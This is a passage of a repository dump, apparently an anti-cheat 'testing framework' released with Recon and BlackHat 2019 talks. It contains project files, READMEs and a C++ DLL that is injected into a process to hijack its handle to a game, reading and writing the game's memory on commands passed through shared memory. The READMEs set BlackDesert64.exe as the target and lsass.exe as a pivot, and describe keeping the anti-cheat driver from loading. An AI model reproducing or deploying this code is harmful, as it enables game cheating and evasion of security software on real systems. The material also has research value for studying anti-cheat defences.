//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

```

`HandleHijackingMaster/HandleHijackingMaster.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>HandleHijackingMaster</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories);</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
      <AdditionalLibraryDirectories>$(SolutionDir)x64\Debug;%(AdditionalLibraryDirectories);C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.16.27023\lib\onecore\x64</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="HandleHijackingMaster.cpp" />
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\CheatHelper\CheatHelper.vcxproj">
      <Project>{a080c117-d1db-4671-8217-65496573ba4d}</Project>
    </ProjectReference>
  </ItemGroup>
  <ItemGroup>
    <None Include="README.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`HandleHijackingMaster/HandleHijackingMaster.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HandleHijackingMaster.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="README.md" />
  </ItemGroup>
</Project>
```

`HandleHijackingMaster/README.md`:

```md
# HandleHijackingMaster

## Introduction


## Usage

This module is used combinaded with **HandleHijackingDLL**. This is the "command and control" implementation. Has to be executed before injecting the DLL. 

HandleHijakingMaster will create a NamedPipe that the DLL will use to receive instructions and then return information to the master (where all the bot logic should be located).

## Configuration

This module requires configuration:

- ~~Address to Read/Write (TODO: implement to use multiple addresses, not just one)~~
- ~~Sequence of actions to perform (TODO: now it tries everything from 0 to 5, implement a list)~~
- ~~HANDLE to use as pivot (TODO: It is hardocded now so it need to be recompiled, it would be better to enumerate handles and identify the correct one).~~
- The following variables in config.ini need to the provided:

[Addresses]
```
RPMAddressHigh=0x1
RPMAddressLow=0x58A60000
RPMAddress=0x0
WPMAddressHigh=0x00000000
WPMAddressLow=0x58A60000
WPMAddress=0x0
ntRVMAddressHigh=0x00000000
ntRVMAddressLow=0x58A60000
ntRVMAddress=0x0
ntWVMAddressHigh=0x00000000
ntWVMAddressLow=0x58A60000
ntWVMAddress=0x0
ZwRVMAddressHigh=0x00000000
ZwRVMAddressLow=0x58A60000
ZwRVMAddress=0x0
ZwWVMAddressHigh=0x00000000
ZwWVMAddressLow=0x58A60000
ZwWVMAddress=0x0
```

[Handles]

```
requestHandleNP=0x15FC
```

[Buffers]
```
#SIZE MUST BE SIZE+1
RPMBuffer=TTTT1
RPMBufferSize=0x6
WPMBuffer=TTTT2
WPMBufferSize=0x6
ntRVMBuffer=TTTT4
ntRVMBufferSize=0x6
ntWVMBuffer=TTTT5
ntWVMBufferSize=0x6
ZwRVMBuffer=TTTT6
ZwRVMBufferSize=0x6
ZwWVMBuffer=TTTT7
ZwWVMBufferSize=0x6
``` 

[Strings]
```
targetProc=BlackDesert64.exe
privotProc=lsass.exe
#Edit in DLL if you changed it here
namedPipeName=\\.\\pipe\\driverbypass
```

## Combination with other techniques

- **RUNASKINVOKER**: By executing the game using this options we will prevent the Anti-cheat to fully protect the game end load the driver.



```

`HandleHijackingMaster/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`HandleHijackingMaster/pch.h`:

```h
// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`README.md`:

```md
# AntiCheat-Testing-Framework
Framework to test any Anti-Cheat on the market. This can be used as Template or Code Base to test any Anti-Cheat and learn along the way. The entry level to reverse AntiCheats and Cheats is quite high, therefore, I'm realeasing all the code I developed during my research. The main idea is to help people and motive them to get into this topic which is really interesting and there is a lot to research about it.

All this code is the result of a research done for Recon2019 (Montreal) and BlackHat Europe 2019 (London). 

Twitter: [@Niemand_sec](https://twitter.com/niemand_sec)

More info: [Personal Blog](https://niemand.com.ar/)

- **Description for each module can be found on each folder**.
- Modules can be used together or separated. 
- Cuztomization should be simple due to the modularity of the code.

# Usage

Most of the settings can be done by using config.ini file, however, some modules may require particular settings on the code, depending on your intentions.

> Remember to change location of config.ini file at CheatHelper/CheatHelper.cpp (variable configFile)

# Modules (more coming in the future)

- CheatHelper
- DriverDisabler
- DriverHelper
- ExternalCheatDriver
- DriverTester
- HandleElevationDriver
- HandleHijackingDLL
- HandleHijackingMaster
- LuaHook
- StealthHijackingNormalDLL
- StealthHijackingNormalMaster

# About this Project

All this code is a result of the Researching presented at Recon 2019 and BlackHat Europe 2019: "Unveiling the underground world of Anti-Cheats"

Links: 
- First Release Info:
  - https://recon.cx/2019/montreal/
  - https://cfp.recon.cx/reconmtl2019/talk/MRJ3CN/
- Second Release:
  - https://www.blackhat.com/eu-19/briefings/schedule/index.html#unveiling-the-underground-world-of-anti-cheats-17359
  
  

```

`StealthHijackingNormalDLL/Readme.md`:

```md
# StealthHandleHijacking DLL

## Introduction


## Usage

This module is used combinaded with **StealthHandleHijackingMaster**. This is the DLL implementation that has to be injected into a process that already has a handle to the game.

HandleHijakingMaster will create a FileMapping (Share Memory) that this module uses to receive instructions and then return information to the master (where all the bot logic should be located).

## Combination with other techniques

- **RUNASKINVOKER**: By executing the game using this options we will prevent the Anti-cheat to fully protect the game end load the driver.



```

`StealthHijackingNormalDLL/StealthHijackingNormalDLL.cpp`:

```cpp
// StealthHijackingNormalDLL.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <iostream>
#include "CheatHelper.h"
#include <windows.h>

#pragma warning(disable:5040)

#define LOCK 0

// EDIT if you modified the original name
TCHAR fileMapName[] = TEXT("Global\\StealthHijacking");

HANDLE hFileMap = NULL;
LPVOID pFileMapMem = NULL;
SIZE_T fileMapSize = FILEMAPSIZE;

PipeMessageRequest PMRequest;
PipeMessageResponse PMResponse;

int ReadFileMapping()
{

	CopyMemory(&PMRequest, (void*)(pFileMapMem), sizeof(PipeMessageRequest));
	std::cout << "[+] Reading Msg: " << std::endl;
	std::cout << "\t[+] action: " << PMRequest.action << std::endl;
	std::cout << "\t[+] handle: 0x" << PMRequest.handle << std::endl;
	std::cout << "\t[+] address: 0x" << std::hex << PMRequest.address << std::endl;
	std::cout << "\t[+] size: " << PMRequest.size << std::endl;
	std::cout << "\t[+] buffer: ";
	CheatHelper::PrintBytes((PVOID)PMRequest.buffer, PMRequest.size);
	return 1;
}


int WriteFileMapping()
{
	SecureZeroMemory(pFileMapMem, FILEMAPSIZE - 1);
	std::cout << "[+] Sending Msg: " << std::endl;
	std::cout << "\t[+] Status: " << PMResponse.status << std::endl;
	std::cout << "\t[+] bytesRead: " << PMResponse.bytesRead << std::endl;
	std::cout << "\t[+] buffer: ";
	CheatHelper::PrintBytes((PVOID)PMResponse.buffer, PMResponse.bytesRead);
	CopyMemory((void*)(pFileMapMem), &PMResponse, sizeof(PipeMessageResponse));
	return true;
}

int handleAction()
{
	switch (PMRequest.action) {
	case 0: //Ping
	{
		std::cout << '0' << std::endl;
		break;
	}
	case 1: //RPM
	{
		std::cout << '1' << std::endl;
		SIZE_T stRead = 0;

		int status = CheatHelper::RPM((HANDLE)PMRequest.handle, (LPCVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, &PMResponse.bytesRead);

		if (status == 0)//SUCCESS
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	}
	case 2: //WPM
	{
		std::cout << '2' << std::endl;
		SIZE_T stWrite = 0;

		int status = CheatHelper::WPM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, &stWrite);

		if (status == 0) //SUCCESS
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	}
	case 3: //CreatRemoteThread
	{
		std::cout << '3' << std::endl;
		break;
	}
	case 4: //NtReadVirtualMemory
	{
		std::cout << '4' << std::endl;

		auto status = CheatHelper::NtRVM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, (PULONG)&PMResponse.bytesRead);

		if (status == 0)
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;

	}
	case 5: //NtWriteVirtualMemory
	{
		std::cout << '5' << std::endl;
		SIZE_T stWrite = 0;

		int status = CheatHelper::NtWVM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, (PULONG)&stWrite);
		if (status == 0)
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	}
	case 6: //ZwReadVirtualMemory
	{
		std::cout << '6' << std::endl;

		auto status = CheatHelper::ZwRVM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, (PULONG)&PMResponse.bytesRead);

		if (status == 0)
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;

	}
	case 7: //ZwWriteVirtualMemory
	{
		std::cout << '7' << std::endl;
		SIZE_T stWrite = 0;

		int status = CheatHelper::ZwWVM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, (PULONG)&stWrite);
		if (status == 0)
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	}
	default:
	{
		std::cout << "Default" << std::endl;
		break;

	}
	}
}

int Init()
{
	
	// UNCOMMENT IF: We need to delay the connection to the Master.
	//Sleep(300000);

	hFileMap = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, fileMapName);
	if (hFileMap == NULL)
	{
		std::cout << "[-] CreateFileMappingA failed: " << GetLastError() << std::endl;
		return false;
	}
	std::cout << "[+] CreateFileMappingA." << std::endl;
	pFileMapMem = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, fileMapSize);
	if (!pFileMapMem)
	{
		std::cout << "[-] MapViewOfFile failed." << std::endl;
		return false;
	}
	std::cout << "[+] MapViewOfFile." << std::endl;
	
	// Closing handle to go stealthier
	CloseHandle(hFileMap);

	CheatHelper::setSpinLockByte(pFileMapMem, !LOCK);

}


int main() {
	CheatHelper::ConsoleSetup("Client");
	Init();

	while (1)
	{
		CheatHelper::checkSpinLockByte(pFileMapMem, LOCK);

		if (!ReadFileMapping())
		{
			std::cout << "[-] Failed reading." << std::endl;
		}

		int success = handleAction();

		if (!WriteFileMapping())
		{
			std::cout << "[-] Failed writing." << std::endl;
		}

		CheatHelper::setSpinLockByte(pFileMapMem, !LOCK);

		if (PMRequest.action == 7)
		{
			break;
		}
	}

	UnmapViewOfFile(pFileMapMem);

}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls(hModule);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)main, NULL, NULL, NULL);
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}




```

`StealthHijackingNormalDLL/StealthHijackingNormalDLL.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>StealthHijackingNormalDLL</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;STEALTHHIJACKINGNORMALDLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>$(VCInstallDir)lib;%(AdditionalLibraryDirectories);C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.16.27023\lib\onecore\x64</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;STEALTHHIJACKINGNORMALDLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;STEALTHHIJACKINGNORMALDLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;STEALTHHIJACKINGNORMALDLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
